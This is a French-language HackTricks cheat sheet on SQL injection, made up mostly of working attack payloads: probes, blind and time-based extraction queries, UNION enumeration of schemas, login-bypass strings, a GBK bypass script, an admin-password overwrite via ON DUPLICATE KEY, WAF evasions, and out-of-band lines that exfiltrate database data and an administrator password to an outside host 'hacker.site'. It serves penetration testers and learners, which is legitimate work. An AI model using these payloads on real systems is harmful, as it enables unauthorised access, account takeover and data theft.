# Injection SQL

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©**? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks**? ou voulez-vous avoir acc√®s √† la **derni√®re version du PEASS ou t√©l√©charger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [d√©p√¥t hacktricks](https://github.com/carlospolop/hacktricks) et au [d√©p√¥t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement le plus pertinent en mati√®re de cybers√©curit√© en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Qu'est-ce qu'une injection SQL?

Une **injection SQL** est une faille de s√©curit√© qui permet aux attaquants d'**interf√©rer avec les requ√™tes de base de donn√©es** d'une application. Cette vuln√©rabilit√© peut permettre aux attaquants de **visualiser**, **modifier** ou **supprimer** des donn√©es auxquelles ils ne devraient pas acc√©der, y compris les informations d'autres utilisateurs ou toutes les donn√©es auxquelles l'application peut acc√©der. De telles actions peuvent entra√Æner des modifications permanentes de la fonctionnalit√© ou du contenu de l'application, voire compromettre le serveur ou provoquer un d√©ni de service.


## D√©tection du point d'entr√©e

Lorsqu'un site semble √™tre **vuln√©rable √† une injection SQL (SQLi)** en raison de r√©ponses de serveur inhabituelles aux entr√©es li√©es √† SQLi, la **premi√®re √©tape** consiste √† comprendre comment **injecter des donn√©es dans la requ√™te sans la perturber**. Cela n√©cessite d'identifier la m√©thode pour **s'√©chapper du contexte actuel** de mani√®re efficace.
Voici quelques exemples utiles:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Ensuite, vous devez savoir comment **corriger la requ√™te pour qu'il n'y ait pas d'erreurs**. Pour corriger la requ√™te, vous pouvez **entrer** des donn√©es pour que la **requ√™te pr√©c√©dente accepte les nouvelles donn√©es**, ou vous pouvez simplement **entrer** vos donn√©es et **ajouter un symbole de commentaire √† la fin**.

_Notez que si vous pouvez voir des messages d'erreur ou rep√©rer des diff√©rences lorsque la requ√™te fonctionne et quand elle ne fonctionne pas, cette phase sera plus facile._

### **Commentaires**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Confirmation avec des op√©rations logiques

Une m√©thode fiable pour confirmer une vuln√©rabilit√© d'injection SQL consiste √† ex√©cuter une **op√©ration logique** et √† observer les r√©sultats attendus. Par exemple, un param√®tre GET tel que `?username=Peter` produisant un contenu identique lorsqu'il est modifi√© en `?username=Peter' or '1'='1` indique une vuln√©rabilit√© d'injection SQL.

De m√™me, l'application d'**op√©rations math√©matiques** sert de technique de confirmation efficace. Par exemple, si l'acc√®s √† `?id=1` et `?id=2-1` produit le m√™me r√©sultat, cela indique une injection SQL.

Exemples d√©montrant la confirmation par op√©ration logique :
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Ce word-list a √©t√© cr√©√© pour essayer de **confirmer les injections SQL** de la mani√®re propos√©e:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Confirmation avec le Timing

Dans certains cas, vous **ne remarquerez aucun changement** sur la page que vous testez. Par cons√©quent, une bonne fa√ßon de **d√©couvrir les injections SQL aveugles** est de faire effectuer des actions √† la base de donn√©es qui auront un **impact sur le temps** n√©cessaire au chargement de la page.\
Ainsi, nous allons concat√©ner dans la requ√™te SQL une op√©ration qui prendra beaucoup de temps √† se terminer:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
Dans certains cas, les **fonctions sleep ne seront pas autoris√©es**. Au lieu d'utiliser ces fonctions, vous pourriez faire en sorte que la requ√™te **effectue des op√©rations complexes** qui prendront plusieurs secondes. _Des exemples de ces techniques seront comment√©s s√©par√©ment sur chaque technologie (le cas √©ch√©ant)_.

### Identification du back-end

La meilleure fa√ßon d'identifier le back-end est d'essayer d'ex√©cuter des fonctions des diff√©rents back-ends. Vous pourriez utiliser les _**fonctions sleep**_ de la section pr√©c√©dente ou celles-ci (tableau provenant de [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
De plus, si vous avez acc√®s √† la sortie de la requ√™te, vous pourriez **faire afficher la version de la base de donn√©es**.

{% hint style="info" %}
Une continuation o√π nous allons discuter des diff√©rentes m√©thodes pour exploiter diff√©rents types d'injections SQL. Nous utiliserons MySQL comme exemple.
{% endhint %}

### Identification avec PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Exploitation bas√©e sur l'Union

### D√©tection du nombre de colonnes

Si vous pouvez voir la sortie de la requ√™te, c'est la meilleure fa√ßon de l'exploiter.\
Tout d'abord, nous devons trouver le **nombre** de **colonnes** que la **requ√™te initiale** renvoie. Cela est n√©cessaire car **les deux requ√™tes doivent renvoyer le m√™me nombre de colonnes**.\
Deux m√©thodes sont g√©n√©ralement utilis√©es √† cette fin :

#### Order/Group by

Pour d√©terminer le nombre de colonnes dans une requ√™te, ajustez progressivement le nombre utilis√© dans les clauses **ORDER BY** ou **GROUP BY** jusqu'√† ce qu'une r√©ponse fausse soit re√ßue. Malgr√© les fonctionnalit√©s distinctes de **GROUP BY** et **ORDER BY** dans SQL, les deux peuvent √™tre utilis√©s de mani√®re identique pour d√©terminer le nombre de colonnes de la requ√™te.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

S√©lectionnez de plus en plus de valeurs nulles jusqu'√† ce que la requ√™te soit correcte :
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
### Extraire les noms de base de donn√©es, les noms de table et les noms de colonnes

Dans les exemples suivants, nous allons r√©cup√©rer le nom de toutes les bases de donn√©es, le nom de la table d'une base de donn√©es, les noms des colonnes de la table:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Il existe une mani√®re diff√©rente de d√©couvrir ces donn√©es sur chaque base de donn√©es, mais la m√©thodologie reste toujours la m√™me._

## Exploitation de l'injection bas√©e sur l'union cach√©e

Lorsque la sortie d'une requ√™te est visible, mais qu'une injection bas√©e sur l'union semble impossible, cela signifie la pr√©sence d'une **injection bas√©e sur l'union cach√©e**. Ce sc√©nario conduit souvent √† une situation d'injection aveugle. Pour transformer une injection aveugle en une injection bas√©e sur l'union, il est n√©cessaire de comprendre la requ√™te d'ex√©cution en arri√®re-plan.

Cela peut √™tre r√©alis√© en utilisant des techniques d'injection aveugle en conjonction avec les tables par d√©faut sp√©cifiques √† votre syst√®me de gestion de base de donn√©es cible (DBMS). Pour comprendre ces tables par d√©faut, il est conseill√© de consulter la documentation du DBMS cible.

Une fois que la requ√™te a √©t√© extraite, il est n√©cessaire d'adapter votre charge utile pour fermer en toute s√©curit√© la requ√™te d'origine. Ensuite, une requ√™te d'union est ajout√©e √† votre charge utile, facilitant l'exploitation de la nouvelle injection bas√©e sur l'union d√©sormais accessible.

Pour des informations plus d√©taill√©es, consultez l'article complet disponible sur [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Exploitation bas√©e sur les erreurs

Si, pour une raison quelconque, vous **ne pouvez pas** voir la **sortie** de la **requ√™te** mais que vous pouvez **voir les messages d'erreur**, vous pouvez utiliser ces messages d'erreur pour **exfiltrer** des donn√©es de la base de donn√©es.\
En suivant un flux similaire √† l'exploitation bas√©e sur l'union, vous pourriez r√©ussir √† extraire la base de donn√©es.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Exploiter les injections SQL aveugles

Dans ce cas, vous ne pouvez pas voir les r√©sultats de la requ√™te ou les erreurs, mais vous pouvez distinguer quand la requ√™te renvoie une r√©ponse vraie ou fausse car il y a diff√©rents contenus sur la page.\
Dans ce cas, vous pouvez abuser de ce comportement pour extraire la base de donn√©es caract√®re par caract√®re :
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Exploitation de l'injection SQL par erreur aveugle

Il s'agit du **m√™me cas que pr√©c√©demment** mais au lieu de distinguer entre une r√©ponse vraie/fausse de la requ√™te, vous pouvez **distinguer entre** une **erreur** dans la requ√™te SQL ou non (peut-√™tre parce que le serveur HTTP plante). Par cons√©quent, dans ce cas, vous pouvez forcer une erreur SQL √† chaque fois que vous devinez correctement le caract√®re :
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Exploiter de l'injection SQL bas√©e sur le temps

Dans ce cas, il **n'y a pas** de moyen de **distinguer** la **r√©ponse** de la requ√™te en fonction du contexte de la page. Cependant, vous pouvez faire en sorte que la page **mette plus de temps √† se charger** si le caract√®re devin√© est correct. Nous avons d√©j√† vu cette technique utilis√©e pr√©c√©demment pour [confirmer une vuln√©rabilit√© SQLi](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Requ√™tes imbriqu√©es

Vous pouvez utiliser des requ√™tes imbriqu√©es pour **ex√©cuter plusieurs requ√™tes successives**. Notez que bien que les requ√™tes suivantes soient ex√©cut√©es, les **r√©sultats** ne sont **pas renvoy√©s √† l'application**. Par cons√©quent, cette technique est principalement utile en relation avec les **vuln√©rabilit√©s aveugles** o√π vous pouvez utiliser une deuxi√®me requ√™te pour d√©clencher une recherche DNS, une erreur conditionnelle ou un retard temporel.

**Oracle** ne prend pas en charge les **requ√™tes imbriqu√©es**. **MySQL, Microsoft** et **PostgreSQL** les prennent en charge : `REQU√äTE-1-ICI; REQU√äTE-2-ICI`

## Exploitation hors bande

Si **aucune autre** m√©thode d'exploitation n'a **fonctionn√©**, vous pouvez essayer de faire en sorte que la **base de donn√©es exfiltre** les informations vers un **h√¥te externe** contr√¥l√© par vous. Par exemple, via des requ√™tes DNS :
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Exfiltration de donn√©es hors bande via XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Exploitation Automatis√©e

Consultez la [Feuille de triche SQLMap](sqlmap/) pour exploiter une vuln√©rabilit√© SQLi avec [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Informations Techniques Sp√©cifiques

Nous avons d√©j√† discut√© de toutes les fa√ßons d'exploiter une vuln√©rabilit√© d'injection SQL. D√©couvrez quelques astuces suppl√©mentaires d√©pendantes de la technologie de base de donn√©es dans ce livre :

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Ou vous trouverez **beaucoup d'astuces concernant : MySQL, PostgreSQL, Oracle, MSSQL, SQLite et HQL dans** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Contournement de l'Authentification

Liste pour essayer de contourner la fonctionnalit√© de connexion :

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Contournement de l'Authentification par Hachage Brut
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Ce query montre une vuln√©rabilit√© lorsque MD5 est utilis√© avec true pour la sortie brute dans les v√©rifications d'authentification, rendant le syst√®me vuln√©rable aux injections SQL. Les attaquants peuvent exploiter cela en cr√©ant des entr√©es qui, lorsqu'elles sont hach√©es, produisent des parties de commandes SQL inattendues, entra√Ænant un acc√®s non autoris√©.
```sql
md5("ffifdyop", true) = 'or'6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbÔøΩ
sha1("3fDf ", true) = QÔøΩu'='ÔøΩ@ÔøΩ[ÔøΩtÔøΩ- oÔøΩÔøΩ_-!
```
### Contournement de l'authentification par hachage inject√©
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Liste recommand√©e**:

Vous devriez utiliser comme nom d'utilisateur chaque ligne de la liste et comme mot de passe toujours: _**Pass1234.**_\
_(Ces charges utiles sont √©galement incluses dans la grande liste mentionn√©e au d√©but de cette section)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### Contournement de l'authentification GBK

SI ' est √©chapp√©, vous pouvez utiliser %A8%27, et lorsque ' est √©chapp√©, il sera cr√©√©: 0xA80x5c0x27 (_‚ïò'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Script Python :
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Injection polyglotte (multicontexte)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Instruction d'insertion

### Modifier le mot de passe d'un objet/utilisateur existant

Pour ce faire, vous devriez essayer de **cr√©er un nouvel objet nomm√© comme l' "objet principal"** (probablement **admin** dans le cas des utilisateurs) en modifiant quelque chose :

* Cr√©er un utilisateur nomm√© : **AdMIn** (lettres majuscules et minuscules)
* Cr√©er un utilisateur nomm√© : **admin=**
* **Attaque de Troncature SQL** (lorsqu'il y a une sorte de **limite de longueur** dans le nom d'utilisateur ou l'e-mail) --> Cr√©er un utilisateur avec le nom : **admin \[beaucoup d'espaces] a**

#### Attaque de Troncature SQL

Si la base de donn√©es est vuln√©rable et que le nombre maximal de caract√®res pour le nom d'utilisateur est par exemple de 30 et que vous souhaitez vous faire passer pour l'utilisateur **admin**, essayez de cr√©er un nom d'utilisateur appel√© : "_admin \[30 espaces] a_" et un mot de passe quelconque.

La base de donn√©es va **v√©rifier** si le **nom d'utilisateur** **introduit** **existe** dans la base de donn√©es. Si ce n'est pas le cas, elle va **tronquer** le **nom d'utilisateur** au **nombre maximal de caract√®res autoris√©** (dans ce cas √† : "_admin \[25 espaces]_") et elle va **automatiquement supprimer tous les espaces √† la fin en mettant √† jour** dans la base de donn√©es l'utilisateur "**admin**" avec le **nouveau mot de passe** (une erreur pourrait appara√Ætre mais cela ne signifie pas que cela n'a pas fonctionn√©).

Plus d'informations : [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Remarque : Cette attaque ne fonctionnera plus comme d√©crit ci-dessus dans les derni√®res installations MySQL. Bien que les comparaisons continuent d'ignorer les espaces de fin par d√©faut, tenter d'ins√©rer une cha√Æne plus longue que la longueur d'un champ entra√Ænera une erreur et l'insertion √©chouera. Pour plus d'informations √† ce sujet, consultez : [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### V√©rification bas√©e sur le temps de l'insertion MySQL

Ajoutez autant de `','',''` que vous estimez n√©cessaire pour sortir de l'instruction VALUES. Si un d√©lai est ex√©cut√©, vous avez une injection SQL.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### SUR CL√â EN DOUBLE MISE √Ä JOUR

La clause `ON DUPLICATE KEY UPDATE` en MySQL est utilis√©e pour sp√©cifier les actions √† effectuer par la base de donn√©es lorsqu'une tentative est faite pour ins√©rer une ligne qui entra√Ænerait une valeur en double dans un index UNIQUE ou une CL√â PRIMAIRE. L'exemple suivant d√©montre comment cette fonctionnalit√© peut √™tre exploit√©e pour modifier le mot de passe d'un compte administrateur :

Injection de Payload Exemple :

Une charge utile d'injection pourrait √™tre con√ßue comme suit, o√π deux lignes sont tent√©es d'√™tre ins√©r√©es dans la table `users`. La premi√®re ligne est un leurre, et la deuxi√®me cible l'e-mail d'un administrateur existant dans le but de mettre √† jour le mot de passe :
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Voici comment cela fonctionne :

- La requ√™te tente d'ins√©rer deux lignes : une pour `generic_user@example.com` et une autre pour `admin_generic@example.com`.
- Si la ligne pour `admin_generic@example.com` existe d√©j√†, la clause `ON DUPLICATE KEY UPDATE` est d√©clench√©e, indiquant √† MySQL de mettre √† jour le champ `password` de la ligne existante avec "bcrypt_hash_of_newpassword".
- Par cons√©quent, l'authentification peut ensuite √™tre tent√©e en utilisant `admin_generic@example.com` avec le mot de passe correspondant au hachage bcrypt ("bcrypt_hash_of_newpassword" repr√©sente le hachage bcrypt du nouveau mot de passe, qui doit √™tre remplac√© par le hachage r√©el du mot de passe souhait√©).

### Extraire des informations

#### Cr√©er 2 comptes en m√™me temps

Lors de la tentative de cr√©ation d'un nouvel utilisateur et d'un nom d'utilisateur, un mot de passe et un e-mail sont n√©cessaires :
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Utilisation de d√©cimal ou hexad√©cimal

Avec cette technique, vous pouvez extraire des informations en cr√©ant seulement 1 compte. Il est important de noter que vous n'avez pas besoin de commenter quoi que ce soit.

En utilisant **hex2dec** et **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Pour obtenir le texte, vous pouvez utiliser :
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
Utilisation de **hex** et **replace** (et **substr**) :
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement le plus pertinent en mati√®re de cybers√©curit√© en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## Injection SQL rout√©e

L'injection SQL rout√©e est une situation o√π la requ√™te injectable n'est pas celle qui donne une sortie, mais la sortie de la requ√™te injectable va √† la requ√™te qui donne une sortie. ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Exemple:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## Contournement de WAF

[Bypass initiaux √† partir d'ici](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Contournement sans espaces

Pas d'espace (%20) - contournement en utilisant des alternatives d'espacement
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
### No Whitespace - contourner en utilisant des commentaires

Dans certains cas, les filtres de s√©curit√© peuvent bloquer les requ√™tes SQL inject√©es en recherchant des mots-cl√©s sp√©cifiques. Pour contourner ces filtres, vous pouvez utiliser des commentaires SQL pour masquer les parties de votre injection. Par exemple, au lieu d'ins√©rer un espace entre les mots, vous pouvez utiliser des commentaires pour rendre le code SQL valide tout en √©vitant les filtres de s√©curit√©.
```sql
?id=1/*comment*/and/**/1=1/**/--
```
### No Whitespace - contourner en utilisant des parenth√®ses

Dans certains cas, les filtres de s√©curit√© peuvent bloquer les mots-cl√©s SQL tels que `OR` ou `AND`, mais autoriser les parenth√®ses. Pour contourner cette restriction, vous pouvez utiliser des parenth√®ses pour regrouper les conditions et ainsi ex√©cuter une injection SQL avec succ√®s.
```sql
?id=(1)and(1)=(1)--
```
### Pas de virgules de contournement

Pas de virgule - contournement en utilisant OFFSET, FROM et JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Contournements g√©n√©riques

Liste noire utilisant des mots-cl√©s - contourner en utilisant des majuscules/minuscules
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Utilisation d'une liste noire de mots-cl√©s insensible √† la casse - contourner en utilisant un op√©rateur √©quivalent
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Contournement de WAF par notation scientifique

Vous pouvez trouver une explication plus d√©taill√©e de cette astuce dans le [blog de gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
Essentiellement, vous pouvez utiliser la notation scientifique de mani√®re inattendue pour contourner le WAF :
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Contourner la restriction des noms de colonnes

Tout d'abord, remarquez que si la **requ√™te d'origine et la table √† partir de laquelle vous souhaitez extraire le drapeau ont le m√™me nombre de colonnes**, vous pouvez simplement faire : `0 UNION SELECT * FROM flag`

Il est possible d'**acc√©der √† la troisi√®me colonne d'une table sans utiliser son nom** en utilisant une requ√™te comme celle-ci : `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, donc dans une injection SQL, cela ressemblerait √† :
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Ou en utilisant un **contournement de virgule** :
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Ce tour a √©t√© pris sur [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### Outils de suggestion de contournement de pare-feu d'application web

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Autres guides

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Liste de d√©tection de force brute

